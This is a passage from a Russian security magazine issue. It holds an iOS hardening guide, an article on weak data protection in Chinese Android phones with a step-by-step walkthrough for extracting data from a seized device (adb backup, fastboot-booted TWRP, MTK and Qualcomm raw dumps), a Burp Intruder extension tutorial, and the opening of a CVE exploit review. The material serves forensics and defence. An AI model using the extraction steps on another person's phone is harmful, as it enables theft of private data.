                                                                 ограничений





Единственный недостаток меню «Ограничения» — слабая защита четы-
рехзначным цифровым паролем.
   Для защиты паролем каждого приложения нет системного решения, при-
дется устанавливать специальные утилиты. Твик iProtect позволяет установить
пароль на запуск каждой программы, а BioProtect — использовать отпечаток
пальца для идентификации пользователя. Оба они доступны в стандартном
репозитории BigBoss, и, к сожалению, за второй придется заплатить, а первый
распространяется бесплатно только в качестве демоверсии, которой можно
пользоваться всего десять дней.





                                                Защита приложения паролем


На что стоит установить пароль в первую очередь? На Cydia,
на доступ к командной строке, чтобы было труднее изменить
файлы твика. А также на все программы, где хранятся личные
данные (заметки, фотографии, почта, сообщения).
   Стоит удалить твики Apple File Conduit 2 и afc2add, если
                                                          INFO
они установлены, так как при их помощи можно получить до-
ступ ко всей файловой системе устройства с любого ком-        Среди
пьютера.                                                                   дополнительных
                                                                             возможностей   Следующий шаг — дополнительно обезопасить команд-                                                                                                  iProtect можно
ную строку. Для этого поменяй пароли пользователей root        выделить
и mobile. Введи сначала su root и пароль (стандартный —       блокировку
                                                                              различных группalpine), затем напиши в терминале passwd и свой новый код,                                                                               приложений,
после этого введи пароль еще раз. Теперь ту же самую опера-                                                                               блокировку папок
цию выполни уже с пользователем mobile, пароль у которого      и даже смену
изначально отсутствует. В итоге, даже если несанкциониро-     цвета клавиатуры
                                                                                  для ввода
ванному пользователю удастся получить доступ к терминалу,                                                                                 кода защиты
никаких важных действий он совершить не сможет.                   приложений.





                                     Установка нового пароля для пользователя root


Важный аспект, касающийся безопасности, — защита сохраненных паролей
Safari. Их стоит или вовсе удалить и затем держать в защищенной паролем за-
метке («Настройки   Заметки   Пароль», после установки пароля эта опция
доступна для каждой отдельной записи в меню «Поделиться»), или поставить
пароль на само приложение «Настройки».

МЕХАНИЗМЫ ЗАЩИТЫ, ПРЕДЛАГАЕМЫЕ APPLE
Наверное, системы безопасности  от самого производителя «яблочных»
устройств на пользовательском рынке наиболее совершенны. В этой части
статьи будут рассмотрены такие механизмы и сервисы, как «Найти iPhone»,
двухфакторная аутентификация и «Связка ключей iCloud».
   Функция «Найти iPhone» была презентована давно, но настоящую цен-
ность приобрела после добавления Activation Lock, опции, требующей ввода
пароля привязанного Apple ID при активации аппарата. До этого блокировку
устройства можно было снять перепрошивкой. Обойти ее невозможно — она,
как и цифровой сертификат для перепрошивки, завязана на серверы Apple.
Информация надежно шифруется, потому взломать Activation Lock не получи-
лось еще ни у одного хакера.
   Включить данный сервис просто. Зайди в раздел настроек «iCloud», выбери
«Найти iPhone (iPad)» и активируй опцию. Даже пароля не потребуется. А вот
выключить сервис можно уже только введя Apple ID.
   Кроме того, была создана одноименная программа для удаленного отсле-
живания состояния устройств. Благодаря данной утилите можно его разблоки-
ровать, если оно было украдено, или отобразить телефон и прочую информа-
цию о владельце (в таком случае разблокировка со стороны злоумышленника
будет невозможна даже через поддержку Apple).
  В приложении отображается список всех привязанных устройств. Выбери
необходимое для отображения дополнительных опций. Здесь можно исполь-
зовать несколько вариантов действий: воспроизвести звук, активировать «Ре-
жим пропажи» или стереть все данные с девайса. При активации «Режима про-
пажи» необходимо указать телефон, а также ввести сообщение, которое будет
отображаться на экране. Оно появится или на экране блокировки, или в меню
активации, как только iPhone соединится с сервером Apple (а для активации
обязательно необходимо подключение к Сети).





        Меню настроек «Найти iPhone»                      «Режим пропажи»


Теперь немного о двухфакторной ау-
тентификации. Это опция, позволя-
ющая подтверждать ввод Apple  ID
при помощи кода, который приходит
на соответствующий номер телефо-
на. При условии, что баннеры уве-
домлений отключены в любом виде,
зайти и увидеть код злоумышленник
сможет только после того, как сна-
чала введет пароль разблокировки,
а затем еще и пароль на само при-
ложение. Для подключения данно-
го сервиса перейди на сайт «Мой
Apple ID». Затем войди в учетную за-
пись там, в поле «Безопасность» на-
жми «Двухэтапная проверка». Ответь
на контрольные вопросы, которые ис-
пользовал при регистрации учетной
записи.                                         Местонахождение устройства
                                         и действия, которые для него доступны

  Стартовое меню





Как видим из описания сервиса, кроме пароля, теперь у тебя будет и ключ
восстановления, им можно будет воспользоваться, если пароль забыт. А вот
секретные вопросы или резервная электронная почта уже практически не по-
надобятся.





                                          Меню ввода номера телефона

На указанный номер телефона придет одноразовый код, его нужно ввести в со-
ответствующее поле. Теперь, после подтверждения, можно выбрать другое
iOS-устройство, куда при помощи сервиса «Найти iPhone» может прийти код.
Устройство должно быть обязательно подключено к Сети. Кстати, такие коды
будут отображаться уже не просто как сообщения SMS, а как предупреждения,
поэтому стоит осторожно отнестись к привязке дополнительных девайсов.





                                            Привязка дополнительных устройств

Следующим шагом будет предоставление ключа восстановления. Это код, со-
стоящий из 14 знаков, первая группа в два знака и три группы по четыре знака,
группы соединены тире. Apple позаботилась даже о том, чтобы скопировать
ключ привычным способом было невозможно. После необходимо подтвер-
дить, что ты знаешь код, введя его. Вставка опять же не работает. Следует от-
ветственно отнестись к хранению ключа восстановления, ведь без него вос-
становить учетную запись при забытом пароле попросту невозможно, а все
данные теряются навсегда.
   Финальное окно настройки двухэтапной проверки. Последнее ознаком-
ление перед включением функции. Ставим галочку в соответствующем поле
и начинаем пользоваться:





                                 Меню включения двухэтапной авторизации

Теперь при переходе на страницу управления Apple ID необходимо будет вво-
дить одноразовый код. Напоминаем, что при подтверждении проверенных
устройств уведомление будет приходить в виде предупреждения (системное
меню, которое появляется над открытым окном приложения), а потому вся
ценность данного способа защиты сведется на нет.
   Последнее средство безопасности — «Связка ключей». Эта утилита пред-
назначена для хранения паролей не только от сайтов, но и от сетей Wi-Fi и ак-
каунтов. Все данные зашифрованы, хранятся в облаке или на устройстве, од-
нако доступны для автозаполнения.
   Для активации функции, как и в случае с двухэтапной авторизацией, необ-
ходимо привязать номер мобильного телефона. Подключаешь сервис в «На-
стройки    iCloud    Связка ключей», затем вводишь необходимый номер.
Во время регистрации также будет возможность создать код безопасности
iCloud — шестизначную комбинацию цифр для подтверждения нового устрой-
ства. Если код безопасности не создан, данные не будут синхронизироваться
и загружаться на серверы Apple.
   Соответственно, для добавления нового аппарата необходимо сначала ак-
тивировать функцию, затем ввести код безопасности или выбрать подтверж-
дение с уже авторизированного устройства.
   Стоит обратить внимание, что использование сервиса нельзя назвать без-
опасным. Многие приложения, которые требуют авторизации, хранят свои дан-
ные в «Связке ключей». То же самое касается и веб-сайтов. Возможно, пароли
и не будут найдены, но вот зайти в почтовый аккаунт или на интернет-страницу
с личной информацией злоумышленник сможет легко. Этот сервис предназна-
чен для облегчения ввода паролей, но не для увеличения защищенности аппа-
рата. Кроме того, при потере кода безопасности все пароли будут сброшены.

ICAUGHTU PRO — ПРОГРАММА ДЛЯ ОТСЛЕЖИВАНИЯ
УКРАДЕННОГО УСТРОЙСТВА
После кражи iPhone все еще есть шанс его найти и вернуть. Например, с по-
мощью стандартного сервиса Apple Find My iPhone — правда, возможностей
у него кот наплакал. Но если есть джейлбрейк, можно установить гораздо бо-
лее развитый инструмент iCaughtU Pro из репозитория BigBoss.
   Программа имеет большие возможности. Она позволяет при выполнении
определенных действий отослать фотографию с передней камеры, местона-
хождение устройства, время, когда это действие (к примеру, неправильный
ввод пароля или Touch ID) было произведено. Все эти данные могут быть от-
правлены на выбранный ящик электронной почты.





                                                     Главное меню твика iCaughtU





                                                 Один из подразделов меню


Утилита имеет и ряд дополнительных функций: так на-
зываемый Fake Mode, позволяющий открыть доступ
лишь к определенным приложениям после ввода не-
правильного  пароля, или управление при помощи
SMS-команд (естественно, только для iPhone). Еще
можно скрыть иконку приложения для того, чтобы засе-
                                                        INFO
кретить передачу данных владельцу устройства.
  В общем, это достаточно надежный способ по-     В режиме Fake Mode
иска устройства, особенно если учесть возможность         твика iCaughtU
                                                                         пользователю даетсяудаленного фотографирования. В отличие от «Найти                                                                        ограниченный доступ
iPhone», который, вероятнее всего, вынудит вора про-          к системе даже
дать устройство на запчасти, эта программа позволит    при вводе неправильного
                                                                            пароля. Таким образом,с большей вероятностью вернуть его.                                                                       данная программа имеет
   Стоимость приложения составляет всего 2,5 долла-                                                                           доступ к паролю экрана
ра в Cydia, оплачивать нужно через PayPal. Согласись,          блокировки.
не каждое приложение за такую цену может похвастать-
ся столь важной функциональностью.

ЗАКЛЮЧЕНИЕ
Как видим, инструментов для того, чтобы обезопасить
данные на устройстве, немало — начиная с эффективной
защиты экрана блокировки и заканчивая возможностью
                                  WWWвозвращения аппарата владельцу в случае кражи. Глав-
ное — правильно и обдуманно ими пользоваться и к тому           iProtect
же следовать базовым принципам хранения персональ-
                                                                                         BioProtectных данных, принципам, которые важны для любого де-
вайса, вне зависимости от его операционной системы.                                                                                  Apple File
                                                                                     Conduit 2

                                                                                   afc2add

                                                               Мой Apple ID

                                                                                iCaughtU Pro
 MOBILE
ОПАСНЫЙ
КИТАЙ
 ГОВОРИМ
 О ЗАЩИЩЕННОСТИ
 КИТАЙСКИХ
 СМАРТФОНОВ
 И ВЗЛАМЫВАЕМ ИХ





       Олег Афонин,
     Эксперт по мобильной
    криминалистике компании
          Элкомсофт
    aoleg@voicecallcentral.com





 Полгода назад мы уже писали о лотерее с покупкой
 устройств из Китая, выигрыш в которой — сносно рабо-
 тающий смартфон за относительно небольшие деньги.
 Вроде бы мы потоптались на всех мозолях: и о гаран-
 тии поговорили, и о соответствии «бумажных» характе-
 ристик фактическим, и о копеечной экономии, и даже
 о вредоносных программах в прошивках, которые ста-
 вят китайские продавцы. Казалось бы, что тут еще можно
 добавить? Тем не менее нельзя считать тему мобильных
 устройств из Китая полностью раскрытой, не проведя ис-
 следование в еще одной немаловажной области: безо-
 пасности тех данных, которые хранятся в смартфоне.

 КИТАЙ И БЛОКИРОВКА ЗАГРУЗЧИКА
 На первый взгляд — ну какие могут быть варианты с загрузчиком? Он либо за-
 блокирован, либо нет. Но не все так просто.
   В Android с загрузчиками вообще разброд и шатание. Бывают (кроме про-
 изводителей первого, второго и третьего эшелонов) устройства с полностью
 разблокированным загрузчиком: заходи, дорогой! Бывают такие, загрузчик
 у которых можно разблокировать официально, на свой страх и риск, с обяза-
 тельным затиранием всех данных. В таких устройствах разблокирование за-
 грузчика часто сопровождается потерей гарантии производителя (как в неко-
 торых моделях Sony и Motorola), но есть варианты и без нее (как в устройствах
 линейки Google Nexus, OnePlus, некоторых моделях Motorola).
    Встречаются устройства, загрузчик которых как бы и заблокирован, но за-
 грузить неподписанное ядро командой fastboot boot boot.img без потери дан-
 ных по какой-то причине они позволяют. К таким относятся, например, многие
 смартфоны и планшеты ASUS (кстати, это производитель второго или третьего
 эшелона?).
    Чего точно не бывает у сертифицированных Google производителей, так
 это устройств, совершенно спокойно позволяющих разблокировать загрузчик
 без обязательного затирания данных. Разблокирование загрузчика всегда ис-
 ключительная ситуация, к ней прибегают разработчики и продвинутые поль-
 зователи, которым хочется получить root-доступ и которые хорошо понимают
 (или должны понимать) связанные с этим риски.
   А вот у подавляющего большинства китайских производителей разблоки-
 рованный загрузчик — дело жизни и смерти. Дело в том, что в Китае сервисы
 Google официально запрещены и производители не устанавливают их в свои
 устройства, предназначенные для продажи на местном рынке. Что совершен-
 но не мешает ушлым посредникам продавать такие смартфоны на междуна-
 родных торговых площадках. Но кто в здравом уме купит телефон без магазина
 Google и сопутствующих сервисов? Вот на этом месте и происходит установ-
 ка продавцом «подвальной» прошивки. Из неизвестных источников китайские
 умельцы берут модифицированные прошивки, в которых установлены серви-
 сы Google. Но добрых самаритян в «неизвестных источниках» не наблюдается,
 и затраты своего времени умельцы отбивают установкой в прошивку самого
 разнообразного мусора. В английской литературе для него используется тер-
 мин potentially unwanted programs, мы же ограничимся стандартным определе-
 нием «вредоносные программы».
    Вирусами в классическом смысле слова эти программы не являются: зараз-
 ить другой аппарат они не смогут. Удалять или шифровать твои файлы они тоже,
 скорее всего, не станут. А вот активироваться через неделю-другую после того,
 как ты настроишь телефон, скачать и установить в системную область (чтобы
 наверняка!) несколько приложений, которые будут показывать тебе самую от-
 кровенную рекламу в самые неожиданные моменты, — это за милую душу.





                                                           LeEco Le1 Pro: от-
                                                      личный смартфон
                                                              за 150 евро с 4 Гбайт
                                                     RAM, 64 Гбайт eMMC
                                                        и Snapdragon 810.
                                                В прошивке — полный
                                                          комплект троянов.
                                                      Перепрошивка строго
                                                            обязательна





 Так вот, для того чтобы установить в телефон стороннюю прошивку, в боль-
 шинстве случаев используются команды fastboot или сами по себе (через
 fastboot flash system), или с целью прошивки области восстановления (custom
 recovery) через fastboot flash recovery, после чего дальнейшие действия ведут-
 ся уже из более дружелюбного интерфейса.
   Проблема здесь, в общем-то, одна: для корректной работы всего этого хо-
 зяйства необходимо отключить проверку цифровой подписи загрузчиком ап-
 парата. Иначе говоря — разблокировать загрузчик. Но в случае с китайскими
 аппаратами все гораздо проще. Большинство устройств поставляется на ры-
 нок с открытыми для любых манипуляций загрузчиками; меньшинство — по-
 зволяет разблокировать загрузчик одной командой. Совсем уж исключитель-
 ное меньшинство или не позволяет разблокировать загрузчик вообще (как
 в новых устройствах Meizu), или, как Xiaomi, требует (по крайней мере, в тео-
 рии) некоторых неочевидных манипуляций.
   В результате ты как пользователь получаешь смартфон с заведомо раз-
 блокированным загрузчиком и непонятной прошивкой с кучей троянов. Ну или
 с вполне себе стандартной прошивкой для международного рынка, но опять
 же с разблокированным загрузчиком.

 Особый загрузчик Xiaomi

 В случае со смартфонами Xiaomi к двум обычным состояниям загрузчика —
 «заблокирован» и «разблокирован» — добавляется третье: «не заблокиро-
 ван». Именно в таком незаблокированном состоянии большинство устройств
 поставляется с завода. Установка свежей официальной прошивки (через OTA
 или самостоятельно) приводит к немедленной блокировке загрузчика — в це-
 лях безопасности. Разблокировать загрузчик после этого (привести к состо-
 янию «разблокирован», что позволит устанавливать любые прошивки) мож-
 но через официальный запрос из учетной записи Mi Account. Стремление
 похвальное, но откат к более старой версии MIUI позволяет вернуть загруз-
 чик в состояние «не заблокирован» даже без потери данных. Разработчики
 из Apple наверняка кусают локти от зависти.



 ЧЕМ ПЛОХ РАЗБЛОКИРОВАННЫЙ ЗАГРУЗЧИК
 Итак, с возможными состояниями загрузчика мы более-менее разобрались.
 Из-за чего, собственно, весь сыр-бор и почему мы акцентируем внимание
 на состоянии загрузчика? Все просто: из устройства с незаблокированным за-
 грузчиком данные можно извлечь на счет «раз». Да, Android в целом не блещет
 безопасностью, и данные из смартфонов, к примеру, LG можно извлечь и так,
 с использованием специализированного ПО и сервисного режима. Да и у дру-
 гих производителей часто доступен такой режим, который есть у большинства
 производителей мобильных чипсетов, включая Qualcomm, MTK, Spreadtrum
 и Allwinner. Но там злоумышленнику придется постараться чуть больше, ре-
 зультат не гарантирован, а если активировано шифрование, то не гарантиро-
 ван совсем.
   В китайских же устройствах твои данные подаются злоумышленнику на блю-
 дечке с голубой каемочкой. Вот тебе телефон, вот тебе TWRP, подключай
 OTG-флешку и сливай на нее информацию. Никакой квалификации или специ-
 ализированного софта не нужно, и даже следов не останется. Единственное,
 что здесь может помочь, — активация шифрования раздела данных в настрой-
 ках устройства. Впрочем, не всегда: к примеру, в наборах системной логики
 Qualcomm Snapdragon обнаружена серьезная уязвимость, при использовании
 которой можно извлечь ключи шифрования из TrustZone. Подробнее об этом.


 Что могут украсть

 А что, собственно, можно украсть из телефона? Пароли там вроде бы не хра-
 нятся, все давно перешли на маркеры аутентификации... или как? Действитель-
 но, пароли не сохраняются, но и с помощью маркера аутентификации получить
 доступ к твоим учетным записям вполне возможно, не говоря уже о том, что
 все сохраненные на смартфоне данные также попадут в руки злоумышленни-
 ку. Более того, если ты используешь двухфакторную аутентификацию и у тебя
 установлено приложение Google Authenticator или подобное, то данные этого
 приложения злоумышленник может запросто извлечь и преспокойно исполь-
 зовать на другом устройстве: генерируемые коды работают, мы проверили.

 ДАТЧИКИ ОТПЕЧАТКОВ ПАЛЬЦА
 Еще один интересный и совсем не очевидный момент — то, как китайские
 производители реализуют аутентификацию пользователя по датчику отпечат-
 ков пальца (на эту тему — отдельная подробная статья в следующем номере).
 Если в двух словах, то биометрическая аутентификация в Android прошла че-
 рез стадию «лучше бы ее не было» (отпечатки хранятся в виде BMP-файлов,
 доступных любому при подключении устройства к компьютеру через USB)
 к современному состоянию «пока не работает, но вы старайтесь!» (из ново-
 стей: «Полиция получила доступ к данным, разблокировав телефон отпечат-
 ком пальца, изготовленным на 3D-принтере»).
   При этом винить разработчиков Google, главного локомотива Android, тя-
 жело: в Android 6.0 появился как API, так и обязательный для всех сертифици-
 рованных производителей устройств на Android набор требований к реализа-
 ции проверки по отпечаткам пальцев. Так что смартфоны на базе Android 6.0
 от сертифицированных производителей просто обязаны использовать «пра-
 вильный» механизм аутентификации по отпечаткам с надежным хранением са-
 мого отпечатка в памяти устройства.
   Все хорошо, вот только эта самая сертификация нужна исключительно
 для того, чтобы производитель мог легально устанавливать на свои устройства
 сервисы Google. Не сам Android, а именно магазин Google Play, службы Google
 Services, карты Google и прочие приложения, без которых западный пользова-
 тель не представляет себе телефон на Android. А если сервисы Google (запре-
 щены на территории Китайской Народной Республики) в устройство не уста-
 навливаются, то и недешевую сертификацию проходить совсем не надо.
    Как ты думаешь, много ли найдется китайских производителей, готовых
 выкинуть десяток тысяч долларов на сертификацию, которая им совершенно
 не нужна? Такой сертификат они получают только на те модели, которые офи-
 циально поставляются на западный рынок, а цена процедуры логично включа-
 ется в себестоимость. Купленные в китайских онлайновых магазинах уж точно
 никем не сертифицированы.
   В результате ты получаешь устройство, в котором датчик отпечатков паль-
 цев (если он есть) как-то прикручен. Сами отпечатки как-то хранятся, и теле-
 фон как-то разблокируется при прикладывании пальца. Жесткие требования
 Google соблюдаться не будут (зачем китайскому производителю, а тем более
 разработчику кастомной прошивки усложнять себе жизнь и тратиться на тести-
 рование и сертификацию?). Соответственно, разблокировать такое устрой-
 ство можно будет даже проще, чем перебором PIN-кодов.
   Но дело не только в датчике отпечатков. Начиная с Android 6.0 Google тре-
 бует от производителей включать шифрование раздела данных «из коробки».
 (Там есть тонкости, касающиеся совсем слабых устройств, но такие модели
 нас не интересуют.) А вот китайские производители эти требования с чистой
 совестью игнорируют.

 КАК ВЗЛОМАТЬ
 Если к тебе в руки попал китайский аппарат, из которого — в чисто исследова-
 тельских целях! — ты собираешься извлечь данные, то алгоритм здесь доволь-
 но простой.

 Шаг 1
 Телефон включен или выключен?
 Если включен, попробуй его раз-
 блокировать. Удалось? Проверь,
 активировано ли шифрование.
 Если нет, то данные ты сможешь
 вытащить как с загруженной си-
 стемы (если есть root-доступ),
 так и из рекавери (который, воз-
 можно,  придется  установить).
 Если ты работаешь в полиции,
 то я порекомендую на данном
 этапе сделать резервную копию
 данных через ADB. Для этого не-
 обходимо активировать режим
 USB  Debugging  в  настройках
 для  разработчика, подключить
 телефон к компьютеру и выпол-
 нить команду adb backup. Сама
 утилита ADB — это часть Android
 SDK и находится в папке путь/
 до/SDK/platfrom-tools.
    Так  ты  получишь  далеко
 не всю информацию, но этот шаг
 проделать придется — дальней-
 шие действия могут привести
 к модификации данных. После
 этого можно спокойно перегру-
 жать телефон в режим рекаве-
 ри и переходить к следующему
 шагу. А вот если шифрование
 раздела данных включено (мож-           Запрос пароля при выполнении бэкапа
 но проверить через меню «На-
 стройки   Безопасность   За-
 шифровать данные») — ни в коем случае не выключай телефон и не позволяй
 ему заблокироваться. Куй железо, пока горячо, и снимай образ раздела дан-
 ных любой из множества соответствующих программ.

 Шаг 2
 Если же телефон был выключен или же ты убедился, что шифрованием в нем
 и не пахнет, то попробуй загрузить его в режим рекавери. Как правило,
 для этого достаточно выключить устройство, после чего включить его с зажа-
 той кнопкой увеличения громкости (Vol+). Увидел заставку TWRP? Прекрас-
 но! Вставляй OTG-флешку (или обычную флешку через OTG-переходник, или
 даже чистую SD-карту), монтируй ее с использованием кнопки Mount Storage,
 выбирай ее в качестве хранилища и делай резервное копирование (nandroid
 backup) командой Backup. Для твоих целей вполне достаточно копии раздела
 данных (он будет сохранен в обычном архиве формата tar.gz).





                                          Содержимое nandroid backup из TWRP

 А если тебя встречает стоковый рекавери от производителя? Здесь несколь-
 ко вариантов. Если загрузчик не заблокирован, то ты можешь попытаться про-
 шить TWRP (twrp.img — специфичный для конкретной модели образ TWRP):

 $ fastboot flash recovery twrp.img

 После чего перегрузить телефон в режим рекавери и сделать резервную ко-
 пию раздела данных. Если важно обеспечить целостность данных, то рекавери
 можно не прошивать, а загрузить:

 $ fastboot boot twrp.img

 Результат будет тот же.

 Шаг 2, альтернативный
 Что делать, если fastboot недоступен, а кастомный рекавери не грузится
 и не прошивается? Если аппарат китайский, то с большой вероятностью ис-
 пользоваться там будет чипсет от MediaTek (MTK). Данный чипсет очень дру-
 желюбен к хакерам. Тебе потребуются драйверы VCOM от MediaTek, утилита
 SP Flash Tool и MTK Droid Tools. Подробно алгоритм работы с SP Flash Tool я
 расписывать не буду, в Сети их более чем достаточно (раз, два).





                                                            SP Flash Tool

 Этот подход может не сработать с устройствами А-брендов (Sony, LG), кото-
 рые блокируют загрузчик. Заблокированный загрузчик не даст использовать
 универсальный загрузочный образ, с помощью которого SP Flash Tools выпол-
 няет операции над смартфоном.

 Чипсет Spreadtrum

 Если тебе попался телефон на базе Spreadtrum (второй по популярности
 и еще более дешевый китайский чипсет) — сочувствую. Ситуация с загрузчи-
 ками у него похожа на МТК, но дьявол кроется в деталях: там нет универсаль-
 ного загрузочного образа, как в SP Flash Tools. Это означает, что тебе при-
 дется искать загрузчик для конкретной модели (или дорабатывать имеющийся
 для сходной).


 А если чипсет от Qualcomm? Попробуй перевести телефон в режим Qualcomm
 Download Mode (также известный под названиями firmware recovery mode 9006,
 Qualcomm MMC Storage (Diag 9006), Qualcomm HS-USB Diagnostics 9006, HS-
 USB QDLoader 9006, Qualcomm HS-USB 9006 или просто qhsusb 9006 в зависи-
 мости от устройства). Телефон попадает в этот режим, если его выключить, за-
 жать кнопку уменьшения громкости (Vol-) и подключить к компьютеру через USB.
    Если все прошло нормально, то в диспетчере устройств Windows появится
 неизвестное устройство, для которого тебе придется найти и установить нуж-
 ный драйвер. После установки драйвера произойдет удивительное: в консоли
 diskmgmt.msc (Windows) появится несколько безымянных разделов. Монтиро-
 вать их не получится: файловую систему (как правило, ext4 или F2FS) Windows
 не понимает. Так что HDD Raw Copy Tool или eMMC RAW Tool тебе в руки —
 и снимай дамп раздела данных! Надеюсь, мне не нужно объяснять, как смон-
 тировать RAW-образ.





                                                    eMMC RAW Tool

 Самое сложное, что тебе может встретиться, — это зашифрованный раздел
 данных. В этом случае nandroid backup или дамп зашифрованного раздела ты
 сделать сможешь, но он принесет тебе мало пользы. Пароль можно обойти,
 но смысла в этом почти никакого: пароль для шифрования раздела данных
 шифруется паролем на телефон. Если загрузчик не заблокирован, то пароль
 можно попробовать взломать перебором с использованием дампа памяти
 с устройства и специализированного софта (например, UFED), но сделать это
 не так просто. Дополнительная информация.

 ВЫВОДЫ
 Как видишь, вытащить твои данные с китайского смартфона очень и очень про-
 сто. Что же теперь делать? Если мы говорим о защите от спецслужб и орга-
 нов охраны правопорядка — смотреть в сторону китайских смартфонов точно
 не стоит. От квалифицированного хакера с доступом к специализированному
 софту и железу обычные методы тоже не спасут; здесь надо ориентироваться
 скорее на Android-смартфоны от BlackBerry. А вот от случайного гопника или
 кулхацкера Васи Пупкина обезопасить данные вполне можно.
   Поможет комбинация из трех факторов: это защита PIN-кодом, отключен-
 ный Smart Lock и активированное шифрование. А вот такие вещи, как пароль
 на TWRP, не помогают совершенно: разблокированный загрузчик позволяет
 загрузить аппарат в любой другой recovery, который проигнорирует твой па-
 роль. С другой стороны, если ты поставишь пароль на TWRP и заблокируешь
 загрузчик... скорее всего, получишь «кирпич», но к зашифрованным данным
 неквалифицированный хакер уж точно не подберется.
   С защитой PIN-кодом все понятно: без него даже устройства от Apple ока-
 зываются совершенно незащищенными. Smart Lock — знатная диверсия и ши-
 рокая дыра в безопасности, позволяющая разблокировать телефон на основе
 совпадения слабых с точки зрения безопасности факторов.
   Шифрование — сильный аргумент, обойти который можно перебором
 PIN-кода, что требует специального оборудования, знаний и времени. Если
 загрузчик разблокирован — PIN-код возможно подобрать, если у тебя там
 не что-то вроде Q3#lFas4e#Ka0_wEj. Пароль подбирать придется брутфорсом
 по дампу или атакой в очень специальном рекавери, который даст возмож-
 ность запустить атаку на самом устройстве в обход встроенных в Android огра-
 ничений безопасности.
   В то же время шифрование в Android замедляет работу устройства и при-
 водит к повышенной нагрузке на CPU и расходу заряда аккумулятора. Стой-
 кость реализации шифрования в прошивках, не проходивших сертификацию
 Google, вызывает вопросы.
ВЗЛОМ



       WARNING

            Вся информация предоставлена исключительно в ознакомительных целях.
             Лица, использующие данную информацию в противозаконных целях, могут
            быть привлечены к ответственности.
EASY





      ПРИКРУЧИВАЕМ УМНЫЙ ПРОЦЕССИНГHACKHTTP-ОТВЕТОВ В BURP INTRUDER





                                                             f1nnix,
                                                              f1nn.com,
                                                            rusanen@glc.ru


Часто при аудите веб-приложений требуется проана-
лизировать ответ веб-сервера и на основе его анализа
сделать какие-то выводы (желательно в сводную табли-
цу результатов). Burp Intruder — популярный инструмент
для комбинированных атак на параметры HTTP-запроса.
Но кроме извлечения данных из HTML-ответов по про-
стейшей регулярке, он не умеет никак их анализировать.
Исправим это и прикрутим к Intruder свой кастомный про-
цессинг ответов сервера на Python.

Задача
Для демонстрации подхода возьмем простую задачу: есть форум, который
по URL вида http://forum.local/groups/<ID>/users/ выдает список юзе-
ров из группы с ID = <ID>. Список ID групп есть, их около сотни. Задача: найти
группу с наибольшим количеством юзеров, а остальные отсортировать по убы-
ванию.

GET /groups/1/users/ HTTP/1.1
Host: forum.local





                        По URL с ID категории отдается таблица со списком юзеров


Ответ сервера:





Очевидно, нам нужно распарсить HTML-страничку и подсчитать количество
<tr class="user">, а затем вывести это значение в таблицу результатов.
Burp не предоставляет возможностей стороннего постпроцессинга отве-
тов. Научим его!
Решение

Идея состоит в том, чтобы:
1. Похукать момент получения ответа сервера.
2. Обработать его своим кодом
3. Добавить результат вычислений в тот же самый ответ в специальном фор-
   мате и отправить «дальше».
4. Дальше грепнуть это значение по регулярке штатными средствами Burp
    Intruder.

Чтобы реализовать этот трюк, нужно написать расширение для Burp Suite.
Расширения для Burp пишутся на Java, Ruby или Python. Мы напишем
на Python.
  Для начала нужно установить Jython. Скачай его, разархивируй в любую
папку и укажи Бурпу путь к бинарнику во вкладке Extender => Options =>
Python environment.





                  Настраиваем окружение для исполнения Python-расширений в Burp


Для разбора HTML нужно поставить HTML-парсер. Я буду использовать
Beautiful Soup. Ставь через pip, но учти, что нужно пользоваться не систем-
ным pip’ом, а jython’овским, который лежит в директории бинарника jython
(см. предыдущий скрин):

user@localhost:~/jython2.7.0/bin$ ./pip install beautifulsoup4
...
После этого создавай файл response_processor.py и добавляй следую-
щий код:





Кратко:

1. Получаем body.
2. Парсим его содержимое.
3. Считаем количество tr’ов класса user.
4. Добавляем к body строчку !--USERS:N-->', где N — количество юзеров.

Также в блоке есть пример модификации заголовков HTTP-ответа. Пра-
вильнее передавать небольшие значения через X-заголовки, но для де-
монстрации сойдет и так. Больше комментариев у автора оригинального
скрипта на Гитхабе.
  Загружаем наше расширение в Burp в соответствующей вкладке.





                                                 Активируем наше расширение


Пробуем запустить Intruder с ним и видим, что теперь в body и headers до-
писываются нужные данные.





                                                  Модифицированный body

Теперь остается только грепнуть это значение по простейшей регулярке,
и вуаля! Обрати внимание, что результаты грепаются как строка, это будет
влиять на сортировку.





                                 Получили нужные данные в таблицу результатов

Разумеется, пример с подсчетом DOM-элементов чисто умозрительный.
В реальности ты можешь проводить абсолютно любой постпроцессинг
данных с использованием всей мощи Python и пробрасывать данные в та-
блицу результатов таким нехитрым трюком. Главное, экранируй большие
данные, иначе регулярки могут неправильно сработать.
   Кстати, перед тем, как писать эту заметку, я засабмиттил тикет раз-
работчикам Burp — компании PortSwigger. В ответ они подтвердили, что
штатными средствами или через расширение это сделать нельзя:

   You’re right, there isn’t any way to do this natively within Burp. And
   currently, there is no way for an extension to provide additional data
   columns in the Intruder attack results.

Как видишь, иногда достаточно проявить немного смекалки и взглянуть
на задачу с другой стороны, чтобы найти решение. Удачи :)
ВЗЛОМ





                                                                               Борис Рютин,
                                                                                                                              Digital Security
                                                                                                        b.ryutin@dsec.ru
                                                                                      @dukebarman
     WARNING                                                                       dukebarman.pro

       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
     Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
     материалами данной
             статьи.

ОБЗОР
ЭКСПЛОИТОВ
   АНАЛИЗ НОВЫХ УЯЗВИМОСТЕЙ





    В сегодняшнем обзоре мы пройдемся по многочисленным
   уязвимостям в продуктах компании NUUO, которая занимается
разработкой систем для камер наблюдения. Помимо этого, разберем
   несколько уязвимостей, которым были подвержены популярные
    среды разработки компании JetBrains (PyCharm, IntelliJ IDEA,
WebStorm и другие): удаленное выполнение кода и раскрытие файлов.

МНОГОЧИСЛЕННЫЕ УЯЗВИМОСТИ В NUUO NVRMINI 2 / NVRSOLO
/ CRYSTAL DEVICES И NETGEAR READYNAS SURVEILLANCE
 CVSSv2:      Нет
 Дата релиза: 4 августа 2016 года
 Автор:       Педру Рибейру (Pedro Ribeiro), Agile Information Security
 CVE:         CVE-2016-5674, CVE-2016-5675, CVE-2016-5676,
              CVE-2016-5677, CVE-2016-5678, CVE-2016-5679

NUUO — разработчик систем Network Video Recording (NVR) для камер на-
блюдения. NVR — это встраиваемые системы на Linux для управления каме-
рами, они широко используются по всему миру — в госучреждениях, институ-
тах, банках, малых и средних предприятиях. Помимо прочего, в этих системах
есть пакет ПО Netgear, которое дает возможность записывать видео и вести
мониторинг по сети при помощи хорошо известных систем хранения данных
